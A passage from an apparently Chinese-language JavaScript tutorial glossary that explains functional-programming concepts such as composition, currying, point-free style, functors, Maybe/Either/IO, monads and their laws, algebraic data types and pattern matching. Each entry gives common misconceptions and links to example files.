结构共享是让不可变数据变得**高效**的关键技术：创建新版本时，只复制**从根到被修改节点的那条路径**，未被触及的子树直接复用原版本的引用。在一个平衡树结构里，路径长度是 O(log n)，所以一次「修改」的代价是 O(log n) 而不是 O(n)，而且新旧两个版本共享绝大部分内存。它也是引用相等能当「没有变化」用的原因——React 的 `memo`、Redux 的 `useSelector` 都依赖这个性质做浅比较。

**常见误解**：以为「不可变 = 每次深拷贝」。用 `JSON.parse(JSON.stringify(obj))` 实现的不可变性能很差且丢失 `Date`/`undefined`/循环引用；库（Immutable.js、Immer）之所以存在，就是为了提供带结构共享的实现。

也见 [Persistent Data Structure（持久化数据结构）](#persistent-data-structure持久化数据结构)、[Immutability（不可变性）](#immutability不可变性)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)

### First-class Function（一等函数）

一等函数指「函数在语言里的地位和数字、字符串一样」：可以被赋给变量、作为参数传递、作为返回值返回、放进数组和对象。JS 从一开始就支持（这也是它被称为「披着 C 外衣的 Scheme」的原因）。一句话判据：**语言里凡是能出现「值」的地方，能不能写函数？** 能，就是一等函数。它是[高阶函数（Higher-order Function）](#higher-order-function高阶函数)和[函数组合（Function Composition）](#function-composition函数组合)能够成立的语言前提。

**常见误解**：把「一等函数」和「高阶函数」当同义词。前者是**语言特性**（函数是值），后者是**函数的一种用法**（接收或返回函数）。

也见 [Higher-order Function（高阶函数）](#higher-order-function高阶函数)、[Function Composition（函数组合）](#function-composition函数组合)。

示例：[`06_functions/08_higher_order_functions.js`](06_functions/08_higher_order_functions.js)、[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)

### Higher-order Function（高阶函数）

高阶函数是**接收函数作为参数、或返回函数作为结果**的函数。它把「变化的部分」参数化，从而把「不变的结构」固化下来——`map`/`filter`/`reduce` 参数化的是「对每个元素做什么」，`once`/`debounce`/`memoize` 参数化的是「在被包装函数之外还要做什么」。它是复用代码的主力工具，但要注意它必然带来一层间接调用，在热点路径上可能影响性能（通常可忽略）。详细展开见函数分册与函数目录。

**常见误解**：以为用高阶函数「更函数式、更高级」。`arr.map(parseInt)` 这类经典陷阱正说明它需要更小心：`map` 会把 `(value, index, array)` 三个参数都传给回调，而 `parseInt` 的第二个参数是进制——这正是「会不会用」和「懂不懂」的分界。

也见 [First-class Function（一等函数）](#first-class-function一等函数)、[Currying（柯里化）](#currying柯里化)、[Function Composition（函数组合）](#function-composition函数组合)。

示例：[`06_functions/08_higher_order_functions.js`](06_functions/08_higher_order_functions.js)、[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)

### Function Composition（函数组合）

函数组合是把多个一元函数**串成一条链**，让上一步的输出成为下一步的输入：`(f ∘ g)(x) = f(g(x))`。它的价值在于**用小函数拼出复杂行为**——每个函数只干一件事、可单独测试、可任意重组，而组合结果读起来就像一段「数据流水线的说明书」。组合满足**结合律**（`f ∘ (g ∘ h)` 等于 `(f ∘ g) ∘ h`），所以怎么加括号都对，这是它能自由重构的数学保证。

**常见误解**：以为组合函数必须用库。两行代码 `const compose = (f, g) => x => f(g(x))` 就够；真正需要库的是「可变参数版本 + 类型定义」。

也见 [compose and pipe（compose与pipe）](#compose-and-pipecompose与pipe)、[Point-free Style（无参风格）](#point-free-style无参风格)。

示例：[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)、[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)

### compose and pipe（compose与pipe）

实现组合的两个函数，区别只在**数据流动方向**：`compose(f, g, h)` 返回 `x => f(g(h(x)))`——数学记法（从右向左读懂）；`pipe(f, g, h)` 返回 `x => h(g(f(x)))`——从左向右读，与书写顺序一致。因为 `pipe` 更符合阅读直觉（先做 f、再做 g），在实际代码里比 `compose` 更常用。两者都用 `reduce` 实现：`const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x)`。注意它们通常**只组合一元函数**——多参数函数要先柯里化才能塞进管道。

**常见误解**：把方向记反。记住口诀：**compose 是「从里往外读」，pipe 是「从左往右读」**——不确定时，写一个 `compose(a, b)(x)` 打印一下结果最快。

也见 [Function Composition（函数组合）](#function-composition函数组合)、[Currying（柯里化）](#currying柯里化)。

示例：[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)、[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)

### Point-free Style（无参风格）

「point」在 FP 术语里指**参数点位**，也就是 `x => f(x)` 里的那个 `x`。point-free（无参风格）指「代码里不出现那个参数名」，只描述**做什么变换**，把参数交给组合出来的函数隐式接收：`const inc = x => x + 1` 是有 point 的，`const inc = add(1)` 是无 point 的。它必须和**柯里化的工具函数**配合（`add(1)` 之所以能当一元函数用，是因为 `add` 是柯里化的）。好处是管道读起来清爽；代价是可读性会迅速下降——`compose(map(f), filter(g), reduce(h, 0))` 对不熟悉的人几乎天书。

**常见误解**：以为 point-free 是「函数没有参数」。它只是**不显式写出参数名**，运行时的参数一个都没少。另一个误解是认为它更「高级」——很多团队明确禁止过度 point-free，因为调试时看不到中间变量是真实痛点。

也见 [Eta Reduction（eta归约）](#eta-reductioneta归约)、[compose and pipe（compose与pipe）](#compose-and-pipecompose与pipe)、[Currying（柯里化）](#currying柯里化)。

示例：[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)

### Eta Reduction（eta归约）

eta 归约是「当两侧语义等价时，把多余的参数包装去掉」的变换：`x => f(x)` 可以化简成 `f`，因为两者的行为完全一致。它是 point-free 风格背后的**推导规则**：`const double = arr => arr.map(x => x * 2)` 里，`x => x * 2` 已经无参数可去，但外层 `arr => arr.map(...)` 还可以写成 `compose(map(x => x * 2))`。做 eta 归约的前提是**两者真的等价**——如果 `f` 依赖 `this`、或者参数个数有语义（如 `parseInt` 的第二个参数是进制），化简就会改变行为。

**常见误解**：在 JS 里随意对方法做 eta 归约，最常见的就是 `arr.map(parseInt)`。`f` 作为回调时会收到 `(value, index, array)`，而 `x => parseInt(x)` 只用一个参数——两者不等价，必须显式写箭头函数。

也见 [Point-free Style（无参风格）](#point-free-style无参风格)、[Higher-order Function（高阶函数）](#higher-order-function高阶函数)。

示例：[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)

### Functor（函子）

函子（Functor）是「**可以被 map 的东西**」。严格定义要求两件事：提供 `of` 方法把任意值装进容器（`F.of(x)`），并提供 `map` 方法接收函数 `f`、返回**同样结构的新容器**（`F.of(x).map(f)` 的结果仍然是一个 F，里面装着 `f(x)`）。关键心法是：**map 不改变容器的形状，只改变容器里装的值**。数组、`Promise`、`Maybe`、`Either` 都是函子——理解了「map 是「在容器内做变换」的通用接口」，就能看懂这一整套抽象。

**常见误解**：以为函子是个具体的类。它是一组**必须遵守的规则**（`of` + `map` + 两条函子定律），任何满足它的对象都是函子。另一个误解是把函子和[单子（Monad）](#monad单子)混为一谈：函子的 `map` 要求回调返回**普通值**，而单子的 `chain` 允许回调返回**同类型的容器**——这就是两者的分界线。

也见 [map（抽象映射）](#map抽象映射)、[Functor Laws（函子定律）](#functor-laws函子定律)、[Monad（单子）](#monad单子)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)

### Functor Laws（函子定律）

函子必须满足两条定律，它们不是「数学装饰」，而是**让重构变得安全**的保证。**恒等律（identity）**：`F.of(x).map(x => x)` 必须等价于 `F.of(x)`——map 一个原样返回的函数，不应该产生任何影响。**组合律（composition）**：`F.of(x).map(f).map(g)` 必须等价于 `F.of(x).map(x => g(f(x)))`——连续两次 map 可以合并成一次。组合律的实际价值在于**性能与重构**：既然两者等价，就可以把多次 `map` 融合成一次遍历（融合优化），或者放心地把 `map(f).map(g)` 拆开调试。

**常见误解**：以为定律是「理论上正确的废话」。违反定律的「函子」会造成真实的 bug：如果 `map` 会跳过 `undefined`（而不是老实调用），那么 `map(x => x)` 就不恒等，任何基于「map 不影响结构」的重构或优化都会出错。

也见 [Functor（函子）](#functor函子)、[Monad Laws（单子定律）](#monad-laws单子定律)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)

### map（抽象映射）

`map` 的抽象含义是：**在不改变容器结构的前提下，把容器里的值用函数变换一遍**，返回一个新容器。同一个名字，在不同容器上有不同的具体行为——数组的 `map` 逐元素变换、`Promise` 的 `then` 是「未来的 map」、`Maybe` 的 `map` 会在 `Nothing` 时短路、`Either` 的 `map` 只作用于 `Right`。理解这层抽象之后，「用 map 处理数组」只是它的一个特例，而 `Nothing.map(f)` 什么都不做也不再奇怪：**容器的形状决定了 map 遇到什么情况该跳过**。

**常见误解**：以为 `map` 是数组专有的方法。它是函子接口；另外要注意 `map` 的返回类型**永远是容器**，不会「拆开」——`[1,2,3].map(f)` 得到数组，`Maybe.of(1).map(f)` 得到 `Maybe`。想拆开或串联嵌套容器，那是 [flatMap and chain（flatMap与chain）](#flatmap-and-chainflatmap与chain) 的职责。

也见 [Functor（函子）](#functor函子)、[flatMap and chain（flatMap与chain）](#flatmap-and-chainflatmap与chain)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`23_collections/01_map_basics.js`](23_collections/01_map_basics.js)

### Container（容器）

容器是函子抽象的形象说法：一个「盒子」，里面装着一个值，同时**附带一些额外的语境（context）**。数组的语境是「可能有 0 个或多个」、Maybe 是「可能没有」、Either 是「可能是错误」、Promise 是「可能还没算出来」、IO 是「是个副作用，还没执行」。容器的价值在于把**语境显式化**：以前靠 `if (x == null)` 和 `try/catch` 散布在代码里的判断，现在变成「值的类型」的一部分，可以由 `map`/`chain` 统一处理。

**常见误解**：以为容器必须是自定义类。数组就是最常见的容器，`Promise` 也是——它们是语言内置的函子，只是很多人没意识到自己一直在用。

也见 [Context（上下文）](#context上下文)、[Functor（函子）](#functor函子)、[Maybe（Maybe函子）](#maybemaybe函子)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`40_functional_programming/02_maybe.js`](40_functional_programming/02_maybe.js)

### Context（上下文）

上下文指容器除了「值」之外携带的那份额外信息——它决定了 `map` 的行为规则。数组的上下文是「多重性」（对每个元素做），Maybe 的上下文是「可能为空」（空则短路），Either 的上下文是「可能失败」（失败则短路并携带错误），Promise 的上下文是「异步与时间」，IO 的上下文是「延迟执行的副作用」。**同一个 `map`，不同上下文给出不同语义**，这正是函子抽象的精髓：变换值的动作被统一了，而处理语境的规则被封装在容器里。

**常见误解**：把这里的 context 和 React 的 `Context`（跨层传值的机制）或者 `this` 的「执行上下文」混为一谈。三者只是恰好共用了同一个英文单词，含义完全无关。

也见 [Container（容器）](#container容器)、[Functor（函子）](#functor函子)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`40_functional_programming/03_either.js`](40_functional_programming/03_either.js)

### Maybe（Maybe函子）

Maybe 是「**值可能不存在**」这一语境的容器，有两种状态：`Just(value)`（有值）和 `Nothing`（没值，注意它**不是 `null`**，而是一个有身份的「空容器」）。它的核心规则是短路：`Just(x).map(f)` 得到 `Just(f(x))`，而 `Nothing.map(f)` 直接返回 `Nothing`，**回调根本不会被调用**。于是只要链上任何一环是 `Nothing`，后面所有 map 都自动跳过，最后用 `getOrElse(默认值)` 安全收尾。它替代的是「层层 `if (obj && obj.a && obj.a.b)`」这种防御式取值。

**常见误解**：以为 Maybe 就是「带判空的工具类」。它的真正意义是把**「可能没有」提升为类型的一部分**：拿到一个 Maybe 时，编译器/读者都知道「必须显式处理空的情况」，而不是靠人记得判空。另外 `Nothing` 和 `null` 的区别很关键——`Nothing` 可以被 map，`null` 会直接抛异常。

也见 [Either（Either函子）](#eithereither函子)、[Container（容器）](#container容器)、[Functor（函子）](#functor函子)。

示例：[`40_functional_programming/02_maybe.js`](40_functional_programming/02_maybe.js)

### Either（Either函子）

Either 是「**要么失败、要么成功**」的容器，两种状态为 `Left(error)`（失败，装着原因）和 `Right(value)`（成功，装着结果）。约定俗成称为**右偏（right-biased）**：`map`/`chain` 等操作只作用于 `Right`，`Left` 会自动短路。它和 Maybe 的唯一区别是：**Maybe 的失败是「空」，不携带信息；Either 的失败是一个值**，可以带上错误码、错误消息、出错字段、原始异常。因此需要「知道为什么失败」时用 Either，只需要「有没有值」时用 Maybe。

**常见误解**：以为 Either 是用来「替代 try/catch」的语法糖。它的立场更根本：**把错误从控制流变成数据**。`throw` 会让函数的返回类型说谎（声明返回 User，实际可能抛出），而 `Either<Error, User>` 把「可能失败」写进了返回值里，调用方无法忽略。

也见 [Maybe（Maybe函子）](#maybemaybe函子)、[Pattern Matching（模式匹配）](#pattern-matching模式匹配)、[Sum Type（和类型）](#sum-type和类型)。

示例：[`40_functional_programming/03_either.js`](40_functional_programming/03_either.js)

### IO Functor（IO函子）

IO 函子是「把副作用**包装成值**」的容器：`IO.of(() => ...)` 装的是一个**还没执行的动作**，`map` 组合的是这个动作的描述，直到调用 `run()`（或 `unsafePerformIO()`）才真正执行。它的核心思想是**把「描述」与「执行」分离**：整个程序可以先用纯函数拼装出一份「副作用的说明书」，最后在程序的最外层执行一次。这样副作用就被压缩到了极小的边界内，其余部分全部可测试、可推理。它也是理解更复杂的 `Effect`/`Task`/`ZIO` 类库的概念起点。

**常见误解**：以为 `IO.of(console.log('hi'))` 会延迟打印。`IO.of` 接收的是**已经求值的参数**，所以这行代码当场就打印了——正确写法是 `IO.of(() => console.log('hi'))`，包一个函数进去。这个陷阱（「急切求值 vs 惰性包装」）是 IO 函子最经典的坑。

也见 [Side Effect（副作用）](#side-effect副作用)、[Lazy Evaluation（惰性求值）](#lazy-evaluation惰性求值)、[Side-effect Isolation（副作用隔离）](#side-effect-isolation副作用隔离)。

示例：[`40_functional_programming/08_io_and_effects.js`](40_functional_programming/08_io_and_effects.js)、[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)

### Monad（单子）

单子（Monad）不是魔法，而是一个满足三件事的容器：① 有 `of` 把普通值装进去；② 有 `chain`（别名 `flatMap`/`bind`/`>>=`）接收「返回**同类型容器**的函数」，返回**容器**而不是容器的容器；③ 满足三条单子定律。一句话概括：**Monad = 函子（有 map）+ 能把嵌套容器拍平（有 chain）**。它解决的问题是：现实里的函数天然返回容器（查数据库可能返回 `Maybe`、解析可能返回 `Either`），而函子的 `map` 只接受返回普通值的回调，于是就会套出 `Maybe(Maybe(x))`，`chain` 正是用来把这一层压平的。

**常见误解**：把单子当成「高级模式」或「必须用库」。`Promise` 就是单子（`then` 即 `chain`），数组也是（`flatMap`），你已经天天在用了。另一个常见误解是问「单子有什么用」——它不增加能力，只是给「串联带语境的运算」提供了一个统一的接口。

也见 [Functor（函子）](#functor函子)、[flatMap and chain（flatMap与chain）](#flatmap-and-chainflatmap与chain)、[Monad Laws（单子定律）](#monad-laws单子定律)。

示例：[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)

### flatMap and chain（flatMap与chain）

`chain`（也叫 `flatMap`、`bind`、`>>=`）是单子的核心方法：它接收一个「返回同类型容器」的函数，把结果**压平一层**。对比就清楚了：`Just(3).map(x => Just(x + 1))` 得到 `Just(Just(4))`（嵌套两层），而 `Just(3).chain(x => Just(x + 1))` 得到 `Just(4)`（一层）。JS 里数组的 `flatMap` 就是这个操作（`map` 后 `flat(1)`），而 `Promise.prototype.then` 是它最广为人知的形式——`then` 会识别回调返回的 Promise 并自动摊平，所以 `p.then(f).then(g)` 不会套出 `Promise<Promise<T>>`。

**常见误解**：把 `chain` 当成「更强的 map」而到处替换。规则很简单：**回调查看是否返回容器**——返回普通值用 `map`，返回容器用 `chain`。全用 `chain` 也能跑（单子定律保证 `chain(x => M.of(f(x)))` 等价于 `map(f)`），但会多包一层无意义的 `of`。

也见 [map（抽象映射）](#map抽象映射)、[Monad（单子）](#monad单子)、[Flattening Nested Functors（嵌套函子的压平）](#flattening-nested-functors嵌套函子的压平)。

示例：[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)、[`40_functional_programming/03_either.js`](40_functional_programming/03_either.js)

### of and return（of与return）

`of`（Haskell 里叫 `return`，与「函数返回」无关）是把**任意普通值装进容器**的「最小构造器」：`Maybe.of(1)` 得到 `Just(1)`，`Either.of(1)` 得到 `Right(1)`，`Promise.resolve(1)` 得到已兑现的 Promise，`[1]` 是数组的 `of`。它的存在让代码可以**不依赖具体容器类型**地工作——一段只用到 `of` 和 `chain` 的逻辑，换成 Maybe 还是 Either 都能跑，这就是「面向单子编程」。`of` 也是三条单子定律里出现次数最多的那个符号。

**常见误解**：`of` 会「做点什么」。它只包装，不做判断——`Maybe.of(null)` 得到的是 `Just(null)` 而不是 `Nothing`，这是很常见的困惑。要处理空值，得用专门的构造函数，比如 `Maybe.fromNullable(value)`。

也见 [Monad（单子）](#monad单子)、[Monad Laws（单子定律）](#monad-laws单子定律)。

示例：[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)、[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)

### Monad Laws（单子定律）

单子除了函子两定律之外还要满足三条定律，它们保证 `chain` 的行为「没有意外」。**左单位律**：`M.of(a).chain(f)` 等价于 `f(a)`——用 `of` 包一层再 chain，等于直接调用 f，说明 `of` 是「最中性的包装」。**右单位律**：`m.chain(M.of)` 等价于 `m`——chain 一个「只是包起来」的函数等于什么都没做。**结合律**：`m.chain(f).chain(g)` 等价于 `m.chain(x => f(x).chain(g))`——连续两次 chain 可以合并成一次，怎么加括号都对。结合律是最有实际价值的一条：它让 `Promise` 的 `p.then(f).then(g)` 可以安全地重写成 `p.then(x => f(x).then(g))`，也让编译器/库里能做扁平化优化。

**常见误解**：以为定律是「形式主义」。违反定律会造成真实后果：如果 `Promise` 不满足结合律，那 `then` 链的重构和错误传播就不可靠——正是因为满足了，我们才敢把任意一段 `then` 链抽成函数。

也见 [Monad（单子）](#monad单子)、[Functor Laws（函子定律）](#functor-laws函子定律)。

示例：[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)

### Flattening Nested Functors（嵌套函子的压平）

这是 `chain` 存在的**唯一理由**。问题的来源：`map` 的签名决定了它只能「把值变成新值」，如果你传进去的函数本身就返回容器（如 `findUser` 返回 `Maybe`），`map` 会老实地把整个容器当作值装进去，结果就成了 `Maybe(Maybe(User))`——两层。而两层 `Maybe` 是没法直接用 `map` 取值的：外层 `map` 拿到的内层容器，你还得再 map 一次，于是每多一步操作就多套一层。`chain` 的做法是：调用 f 拿到内层容器后，**只保留内层，丢掉外层的包装**，把深度恒定为 1。JS 里 `Array.prototype.flatMap` 就是这个操作的数组版本（等价于 `map` + `flat(1)`）。

**常见误解**：以为嵌套是「写错了」。它是类型系统下必然出现的结果，不是 bug；正确的应对是**在该用 chain 的地方用 chain**（判据：回调的返回值是不是容器）。另外 `flatMap` 只压平**一层**，三层嵌套要连用两次 chain。

也见 [flatMap and chain（flatMap与chain）](#flatmap-and-chainflatmap与chain)、[Monad（单子）](#monad单子)、[map（抽象映射）](#map抽象映射)。

示例：[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)

### do Notation（do记法）

do 记法是 Haskell 提供给单子的**语法糖**，目的只有一个：把 `m.chain(a => f(a).chain(b => g(a, b).chain(c => ...)))` 这种不断缩进的嵌套写法，拉平成一段**看起来像命令式的顺序代码**：`do { a <- f; b <- g(a); c <- h(a,b); return ... }`。它的关键性质是「每一行都隐式地 chain 了上一行」，所以**语境会自动传递和短路**——中间任何一步返回 `Nothing`/`Left`，后面所有行直接跳过。

JS 没有 do 记法，但 `async`/`await` 就是 Promise 单子的 do 记法：`await` 相当于 `<-`，`return` 相当于 `of`。所以「async 函数里可以用同步的写法写异步」这件事，本质上是「Promise 是个单子 + await 是它的语法糖」。

**常见误解**：以为 `async`/`await` 是全新的语言机制。它只是 Promise 单子的语法糖——这也解释了为什么 `await` 能自动摊平嵌套（`await` 一个 Promise 得到的是它兑现的值而不是 Promise），因为摊平正是 chain 的语义。

也见 [Monad（单子）](#monad单子)、[flatMap and chain（flatMap与chain）](#flatmap-and-chainflatmap与chain)。

示例：[`40_functional_programming/04_monad.js`](40_functional_programming/04_monad.js)

### Algebraic Data Type（代数数据类型）

代数数据类型（Algebraic Data Type，ADT）是「**用类型来描述数据的形状**」的一整套做法，名字里的「代数」来自它用组合方式构造类型：最基本的两种构造是**积类型**（「同时具备 A 和 B」，可能性个数相乘）和**和类型**（「要么是 A，要么是 B」，可能性个数相加）。它和模式匹配是天生一对：用和类型定义「有哪几种情况」，用模式匹配穷尽地处理每一种，让「漏了某种情况」变成编译期错误。JS 没有原生 ADT，但可以用标签联合 + 解构手工模拟。

**常见误解**：以为 ADT 是「抽象数据类型（Abstract Data Type）」的缩写。两者是完全不同的概念：ADT 在这里指**代数**数据类型（和类型/积类型），抽象数据类型指的是「封装了表示的接口」，如栈、队列。

也见 [Product Type（积类型）](#product-type积类型)、[Sum Type（和类型）](#sum-type和类型)、[Pattern Matching（模式匹配）](#pattern-matching模式匹配)。

示例：[`40_functional_programming/06_adt_and_pattern_matching.js`](40_functional_programming/06_adt_and_pattern_matching.js)

### Product Type（积类型）

积类型表示「**同时具备 A 和 B**」，它的取值个数是各部分个数之**积**（所以叫积类型）。对象 `{ name, age }`、元组 `[x, y]`、类实例、带多个字段的记录都是积类型。JS 里的积类型就是对象和解构——这是语言原生支持得最好的部分。关键认识：积类型只能表达「都有」，表达不了「二选一」；要表达「要么这样要么那样」，必须用[和类型](#sum-type和类型)。

**常见误解**：以为字段可选（`{ a?: number }`）就成了和类型。可选字段只是「值可能是 `undefined`」，仍然是一个积类型（`A × (B | undefined)`），它的组合数确实变了，但结构性质还是「所有字段共存」——真正的和类型需要能区分「是哪一种情况」。

也见 [Sum Type（和类型）](#sum-type和类型)、[Algebraic Data Type（代数数据类型）](#algebraic-data-type代数数据类型)。

示例：[`40_functional_programming/06_adt_and_pattern_matching.js`](40_functional_programming/06_adt_and_pattern_matching.js)

### Sum Type（和类型）

和类型表示「**要么是 A，要么是 B**」，取值个数是各部分个数之**和**。它也叫标签联合（tagged union）、可辨识联合（discriminated union）、变体（variant）。JS 里的典型写法是「带 `type` 判别字段的对象」：`{ type: 'loading' } | { type: 'success', data } | { type: 'error', message }`——每个分支携带的数据不同，靠 `type` 字段区分。它是「状态机」和「异步结果」的天然建模方式，比「一堆可空字段 + 布尔标志」清晰得多（后者会产生大量非法状态，比如 `isLoading && isError` 同时为真）。

**常见误解**：以为用 `null` 或错误码就等价于和类型。`{ data: null, error: null, loading: false }` 这种「万能对象」允许非法组合存在；和类型的价值正是**让非法状态无法表示**。

也见 [Tagged Union（标签联合）](#tagged-union标签联合)、[Product Type（积类型）](#product-type积类型)、[Either（Either函子）](#eithereither函子)。

示例：[`40_functional_programming/06_adt_and_pattern_matching.js`](40_functional_programming/06_adt_and_pattern_matching.js)

### Tagged Union（标签联合）

标签联合是 sum type 在**不支持原生和类型的语言**里的实现手法：用一个显式的**标签字段**（惯用名是 `type`、`tag`、`kind`）记录「当前是哪一种情况」，其余字段是该情况的数据。这就是 JS / TypeScript 里的标准做法，也是 [Either（Either函子）](#eithereither函子) 里 `Left`/`Right` 的实现基础。加上 TypeScript 的可辨识联合后，`switch (x.type)` 能自动把类型收窄到对应分支，从而得到穷尽性检查的效果。

**常见误解**：以为标签字段值可以随便是 `0`/`1`/`2` 或布尔。可辨识联合的前提是**标签必须是字面量类型**（字符串或数字字面量），用宽泛的 `string` 类型会让类型收窄失效——这是 TS 里最常见的「联合类型没生效」原因。

也见 [Sum Type（和类型）](#sum-type和类型)、[Pattern Matching（模式匹配）](#pattern-matching模式匹配)。

示例：[`40_functional_programming/06_adt_and_pattern_matching.js`](40_functional_programming/06_adt_and_pattern_matching.js)

### Pattern Matching（模式匹配）

模式匹配是「**按数据的形状分支处理，并同时把数据拆开**」的能力，可以理解为「加强版的 `switch` + 解构」。真正让它与众不同的是**穷尽性检查（exhaustiveness checking）**：编译器能验证你是否处理了所有情况，漏掉一种就报错。这在状态机、异步结果、AST 处理这类「分支必须覆盖全」的场景里价值巨大。

**现状说明**：JavaScript **至今没有原生模式匹配**（相关的 TC39 提案——Pattern Matching 提案——仍在推进中，尚未进入标准），所以本仓库的示例只能用 `switch (x.type)` + 解构、配合一个 `assertNever` 兜底函数来手工模拟穷尽性检查；TypeScript 的可辨识联合能提供**编译期**的穷尽性校验，是目前最接近原生体验的做法。

**常见误解**：以为 `switch` 就是模式匹配。差别在「穷尽性」和「能否拆解」：`switch` 不检查漏分支，也不能在分支条件里直接解构出数据；此外真·模式匹配还支持嵌套模式和守卫条件。

也见 [Tagged Union（标签联合）](#tagged-union标签联合)、[Sum Type（和类型）](#sum-type和类型)。

示例：[`40_functional_programming/06_adt_and_pattern_matching.js`](40_functional_programming/06_adt_and_pattern_matching.js)

### Lazy Evaluation（惰性求值）

惰性求值指「**表达式在真正需要它的值时才计算**」，与之相对的是 JS 默认的**及早求值（eager evaluation）**。它的三大好处：可以表示和操作**无限序列**（如「所有自然数」）、可以**避免不必要的计算**（`cond ? a() : b()` 只算一个分支）、以及可以把「计算」当作值来传递和组合（[IO 函子](#io-functorio函子)就是靠这个把副作用描述成值）。JS 没有内置的惰性求值语义，但提供了几个实现手段：把计算包进**函数**（`() => expensive()`）、用 **generator**（`function*` 天然按需产出）、以及 `Promise`（本身就是延迟执行的结果）。

**常见误解**：以为惰性总是更好。惰性会带来内存泄漏（闭包持有不再需要的引用）、难以调试的求值时机、以及「什么时候才真的执行」的不确定性。JS 生态里的普遍结论是：**默认及早，需要时局部惰性**。

也见 [IO Functor（IO函子）](#io-functorio函子)、[Referential Transparency（引用透明）](#referential-transparency引用透明)。

示例：[`40_functional_programming/01_functor.js`](40_functional_programming/01_functor.js)、[`17_iterators_and_generators/04_generator_basics.js`](17_iterators_and_generators/04_generator_basics.js)

### Currying（柯里化）

柯里化把「接收 n 个参数的函数」改造成「每次只收一个参数、返回下一个函数」的链：`add(1, 2)` 变成 `add(1)(2)`。它的实际价值不在于「少写几个参数」，而在于**部分应用**：`const add10 = add(10)` 得到一个「预设了第一个参数」的新函数，因此可以塞进 `pipe`/`compose` 的管道（管道只接受一元函数）。所以「柯里化」和「point-free」是配套的两件事：工具函数柯里化之后，才能写出无参风格。详细展开见函数分册。

**常见误解**：把柯里化和「部分应用（partial application）」当同义词。柯里化是**固定的一元化变换**（n 个参数变成 n 层嵌套），部分应用是「先填几个参数」这个更宽泛的概念——很多库（如 lodash 的 `partial`）提供的是后者。

也见 [Point-free Style（无参风格）](#point-free-style无参风格)、[Function Composition（函数组合）](#function-composition函数组合)、[Higher-order Function（高阶函数）](#higher-order-function高阶函数)。

示例：[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)、[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)

### Side-effect Isolation（副作用隔离）

副作用隔离是 FP 在真实项目里的**落地策略**：不追求「消灭副作用」，而是把它挤到程序的边界，让核心逻辑保持纯净。具体做法通常是**函数式核心 + 命令式外壳（functional core, imperative shell）**：所有业务规则、计算、转换写成纯函数；IO（请求、读写、日志、时间、随机）集中在少数几个边界函数里，由它们调用纯函数、再把结果交给下一个副作用。收益是分层清晰：核心逻辑用普通单元测试就能覆盖（不需要 mock），副作用层虽然难测但代码量极少。更进阶的做法是用 IO 函子、Effect 系统把副作用变成可组合的数据结构。

**常见误解**：以为隔离副作用是为了「纯粹」或「好看」。真正的动机是**可测试性和可推理性**：一个混了 `fetch` 和日期计算的函数，测试要先起 mock server 再假装系统时间，而拆开之后每一半都变得平凡。

也见 [Side Effect（副作用）](#side-effect副作用)、[Pure Function（纯函数）](#pure-function纯函数)、[IO Functor（IO函子）](#io-functorio函子)。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)、[`40_functional_programming/03_either.js`](40_functional_programming/03_either.js)

### Declarative and Imperative（声明式与命令式）

**命令式**描述「**怎么做**」：一步一步的操作序列（先建空数组，再循环，再 push，再返回）——JS 里 `for` 循环是最典型的形态。**声明式**描述「**要什么**」：把意图直接表达出来，由底层决定怎么执行——`arr.filter(isEven).map(double)` 只说「留下偶数、翻倍」，不说循环和下标。声明式的好处是不变量（循环下标、临时变量、边界条件）被抽象掉了，代码更短、更少出错点，也更容易被优化（库/引擎可以在不改变语义的前提下改变执行策略，如并行、短路、融合）。函数式编程整体上是一种声明式风格。

**常见误解**：以为声明式「一定更快」或「一定更慢」。一般情况下两者性能相当（引擎对高阶函数优化得不错），但命令式在极端热路径上仍可能因为「一次遍历 vs 三次遍历」「避免闭包分配」而更快。取舍的真正依据是**可读性与出错概率**，不是微性能。

也见 [Functional Programming（函数式编程）](#functional-programming函数式编程)、[Higher-order Function（高阶函数）](#higher-order-function高阶函数)。

示例：[`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)、[`06_functions/08_higher_order_functions.js`](06_functions/08_higher_order_functions.js)
